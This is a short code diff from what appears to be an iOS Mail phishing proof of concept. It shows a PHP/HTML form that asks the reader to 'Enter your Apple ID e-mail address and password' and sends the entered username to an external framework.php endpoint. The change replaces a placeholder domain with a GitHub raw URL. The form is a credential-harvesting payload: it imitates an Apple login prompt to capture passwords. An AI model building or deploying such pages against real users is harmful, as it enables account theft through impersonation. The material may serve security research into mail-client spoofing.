@@ -286,7 +286,7 @@ if(isset($_COOKIE["second_visit"])) {
 				Enter your Apple ID e-mail address and password
 			</div>
 
-			<form action="http://your.domain/mail-inject/framework.php" id="myform" method="get" name="myform">
+			<form action="https://raw.githubusercontent.com/yege0201/iOS-Mail-test/master/framework.php" id="myform" method="get" name="myform">
 				<input class="modal-text-input modal-text-input-double" name="modal-username" type="text" value="<?php
 					if (isset($_GET['modal-username'])) {
 					echo htmlspecialchars(stripslashes($_GET['modal-username']));
